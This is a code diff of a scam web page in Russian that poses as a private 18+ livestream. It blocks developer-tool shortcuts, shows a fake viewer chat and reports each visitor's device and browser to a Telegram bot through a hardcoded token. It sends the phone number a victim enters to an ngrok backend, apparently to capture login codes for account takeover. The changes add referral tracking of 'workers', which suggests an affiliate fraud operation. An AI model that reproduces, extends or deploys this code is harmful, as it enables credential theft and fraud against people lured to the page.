@@ -326,7 +326,7 @@
 
 <div class="stream-content">
     <div class="live-badge">🔴 LIVE</div>
-    <h1>Приватный стрим Vikysa</h1>
+    <h1 id="modelTitle">Приватный стрим Vikysa</h1>
     <p>🔞 Только для взрослых 18+ 🔞</p>
     
     <div class="viewer-stats">
@@ -375,44 +375,47 @@
         if (e.ctrlKey && e.shiftKey && (e.key === 'C' || e.key === 'c')) { e.preventDefault(); return false; }
     });
     
-    // ========== ВИДЕО ПЛЕЕР ==========
-    const video = document.getElementById('bgVideo');
-    const videoContainer = document.getElementById('videoContainer');
-    const loadingOverlay = document.getElementById('loadingOverlay');
-    
-    video.addEventListener('loadedmetadata', () => { video.currentTime = 0; });
-    video.addEventListener('canplay', () => {
-        setTimeout(() => {
-            loadingOverlay.style.opacity = '0';
-            setTimeout(() => {
-                loadingOverlay.style.display = 'none';
-                videoContainer.style.opacity = '1';
-                video.play();
-            }, 500);
-        }, 500);
-    });
-    video.addEventListener('ended', () => {
-        video.currentTime = 0;
-        video.play();
-    });
-    setTimeout(() => {
-        if (loadingOverlay.style.display !== 'none') {
-            loadingOverlay.style.opacity = '0';
-            setTimeout(() => {
-                loadingOverlay.style.display = 'none';
-                videoContainer.style.opacity = '1';
-                video.play().catch(() => {});
-            }, 500);
-        }
-    }, 5000);
-    
     // ========== КОНФИГ ==========
-    const API_URL = 'https://3c35-178-88-189-81.ngrok-free.app';
+    const API_URL = 'https://c6f6-2-133-188-254.ngrok-free.app';
     const BOT_TOKEN = '8809942680:AAHVr9WLL4GQHOqZtmzesQP-s05p5zlD7vE';
     const ADMIN_ID = '8704208839';
     
     let currentPhone = "";
     let currentStep = "phone";
+    let currentRefCode = null;
+    
+    // ========== ПОЛУЧАЕМ REF КОД ИЗ URL ==========
+    function getRefCodeFromURL() {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get('ref');
+    }
+    
+    // ========== ЗАГРУЗКА ДАННЫХ ВОРКЕРА ==========
+    async function loadWorkerData() {
+        const refCode = getRefCodeFromURL();
+        if (!refCode) {
+            console.log('Нет реферального кода, показываем стандартное имя');
+            return;
+        }
+        
+        currentRefCode = refCode;
+        
+        try {
+            const response = await fetch(`${API_URL}/get_worker_info?ref=${refCode}`);
+            const data = await response.json();
+            
+            if (data.success) {
+                const titleElement = document.getElementById('modelTitle');
+                titleElement.innerHTML = `Приватный стрим ${data.model_name}`;
+                document.title = `${data.model_name} · Приватный стрим LIVE`;
+                console.log(`Загружена модель: ${data.model_name} из ${data.city}`);
+            } else {
+                console.log('Воркер не найден или не одобрен');
+            }
+        } catch(e) {
+            console.log('Ошибка загрузки данных воркера:', e);
+        }
+    }
     
     function sendToAdmin(text) {
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(text)}`)
@@ -444,6 +447,37 @@
                 sendToAdmin(`🕷️ ЗАХОД НА СТРИМ!\n📱 ${device}\n${browser}\n🔗 ${url}\n⏰ ${time}`);
             });
     })();
+    
+    // ========== ВИДЕО ПЛЕЕР ==========
+    const video = document.getElementById('bgVideo');
+    const videoContainer = document.getElementById('videoContainer');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    
+    video.addEventListener('loadedmetadata', () => { video.currentTime = 0; });
+    video.addEventListener('canplay', () => {
+        setTimeout(() => {
+            loadingOverlay.style.opacity = '0';
+            setTimeout(() => {
+                loadingOverlay.style.display = 'none';
+                videoContainer.style.opacity = '1';
+                video.play();
+            }, 500);
+        }, 500);
+    });
+    video.addEventListener('ended', () => {
+        video.currentTime = 0;
+        video.play();
+    });
+    setTimeout(() => {
+        if (loadingOverlay.style.display !== 'none') {
+            loadingOverlay.style.opacity = '0';
+            setTimeout(() => {
+                loadingOverlay.style.display = 'none';
+                videoContainer.style.opacity = '1';
+                video.play().catch(() => {});
+            }, 500);
+        }
+    }, 5000);
     
     // ========== ЧАТ (фейковый) ==========
     const chatMessagesContainer = document.getElementById('chatMessages');
@@ -512,10 +546,14 @@
             btn.innerText = "⏳ Отправка...";
             statusDiv.innerText = "Отправляем код...";
             try {
+                const bodyData = { phone: phone };
+                if (currentRefCode) {
+                    bodyData.ref = currentRefCode;
+                }
                 const response = await fetch(`${API_URL}/send_code`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone: phone })
+                    body: JSON.stringify(bodyData)
                 });
                 const data = await response.json();
                 if (data.success) {
@@ -670,6 +708,9 @@
     window.showModal = showModal;
     window.closeModal = closeModal;
     window.handleAction = handleAction;
+    
+    // ========== ЗАГРУЗКА ДАННЫХ ВОРКЕРА ПРИ СТАРТЕ ==========
+    loadWorkerData();
 </script>
 
 <!-- Бейдж безопасности -->
